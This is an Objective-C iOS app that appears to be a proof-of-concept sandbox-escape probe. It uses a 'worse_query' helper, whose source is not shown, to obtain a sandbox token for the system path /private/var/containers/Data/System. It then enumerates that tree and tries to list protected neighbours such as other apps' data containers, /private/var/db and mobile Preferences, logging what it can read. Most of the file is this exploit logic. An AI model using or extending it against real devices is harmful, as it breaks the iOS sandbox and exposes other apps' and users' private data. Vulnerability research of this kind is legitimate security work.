#import <UIKit/UIKit.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#import "worse_query.h"

static NSMutableString *out;
static NSString *logPath() { return [NSTemporaryDirectory() stringByAppendingPathComponent:@"out.txt"]; }
static void Log(NSString *l) {
    [out appendString:l]; [out appendString:@"\n"];
    printf("%s\n", l.UTF8String); fflush(stdout);
    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:logPath()]; [h seekToEndOfFile]; [h writeData:[[l stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]]; [h closeFile];
}

// opendir on path, log up to 5 entries
static BOOL ls(NSString *p, NSString *tag) {
    DIR *d = opendir(p.fileSystemRepresentation);
    Log([NSString stringWithFormat:@"  %@: %@", tag, d ? @"OK" : @(strerror(errno))]);
    if (!d) return NO;
    int n = 0; struct dirent *e;
    while ((e = readdir(d)) && n < 5) { if (e->d_name[0] != '.') { Log([NSString stringWithFormat:@"    entry %s", e->d_name]); n++; } }
    closedir(d); return YES;
}

@interface VC : UIViewController @end
@implementation VC
- (void)viewDidLoad {
    [super viewDidLoad];
    UITextView *tv = [[UITextView alloc] initWithFrame:self.view.bounds];
    tv.autoresizingMask = 0x3f; tv.editable = NO; tv.font = [UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];
    tv.textColor = [UIColor greenColor]; tv.backgroundColor = [UIColor blackColor]; self.view = tv;
    dispatch_async(dispatch_get_global_queue(0,0), ^{
        out = [NSMutableString string];
        [@"" writeToFile:logPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
        [self run];
        Log(@"DONE");
        [out writeToFile:logPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
        exit(0);
        dispatch_async(dispatch_get_main_queue(), ^{ ((UITextView *)self.view).text = out; });
    });
}
- (void)run {
    NSString *group = @"group.com.strelov.wqprobe";
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *g = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    Log([NSString stringWithFormat:@"iOS %@", UIDevice.currentDevice.systemVersion]);
    Log([NSString stringWithFormat:@"group root: %@", g.path ?: @"(nil)"]);
    if (!g) return;
    NSString *caches = [[g URLByAppendingPathComponent:@"Library/Caches"] path];
    Log([NSString stringWithFormat:@"caches: %@", caches]);
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];

    // Baseline: query with the real directory in place (no symlink) → does the query/token path work at all?
    for (NSNumber *alt in @[@NO, @YES]) {
        int64_t h = worse_query(caches, group, alt.boolValue, false);
        Log([NSString stringWithFormat:@"baseline (alt=%d) handle = %lld", alt.boolValue, h]);
        worse_query_release(h);
    }
    struct stat st;
    Log([NSString stringWithFormat:@"caches is symlink after baseline: %d", lstat(caches.fileSystemRepresentation, &st) == 0 ? S_ISLNK(st.st_mode) : -1]);

    // What does the granted token actually cover? Walk down Data/System and probe neighbours.
    NSString *sysRoot = @"/private/var/containers/Data/System";
    int64_t h = worse_query(sysRoot, group, false, false);
    Log([NSString stringWithFormat:@"handle for Data/System (alt=0) = %lld", h]);
    if (h < 0) return;
    NSMutableArray *q = [NSMutableArray arrayWithObject:sysRoot]; int seen = 0;
    while (q.count && seen < 400) {
        NSString *dir = q[0]; [q removeObjectAtIndex:0]; seen++;
        DIR *d = opendir(dir.fileSystemRepresentation); if (!d) { Log([NSString stringWithFormat:@"  DENIED %@", dir]); continue; }
        struct dirent *e; int n = 0;
        while ((e = readdir(d))) {
            if (e->d_name[0] == '.') continue; n++;
            NSString *full = [dir stringByAppendingPathComponent:@(e->d_name)];
            if (e->d_type == DT_DIR && [full stringByDeletingLastPathComponent].length == sysRoot.length) [q addObject:full]; // only children of sysRoot
            else if (e->d_type != DT_DIR && n <= 3) Log([NSString stringWithFormat:@"  file %@", full]);
            if (n <= 4 && e->d_type == DT_DIR) Log([NSString stringWithFormat:@"  dir  %@", full]);
        }
        closedir(d);
    }
    // Neighbours under the same extension: are they reachable through the granted path?
    for (NSString *t in @[@"/private/var/containers/Data", @"/private/var/containers", @"/private/var/containers/Shared/SystemGroup", @"/private/var/mobile/Containers/Data/Application", @"/private/var/db", @"/private/var/mobile/Library/Preferences"]) {
        ls(t, [NSString stringWithFormat:@"while holding Data/System token: %@", t]);
    }
    // Try reading a real file inside one of the system containers
    NSString *probe = [sysRoot stringByAppendingPathComponent:@"plist"]; // placeholder; find first file
    worse_query_release(h);
    ls(sysRoot, @"after release");
}
@end
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)x {
    [UIApplication sharedApplication].idleTimerDisabled = YES;
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[VC alloc] init]; [self.window makeKeyAndVisible]; return YES;
}
@end
int main(int argc, char *argv[]) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); } }
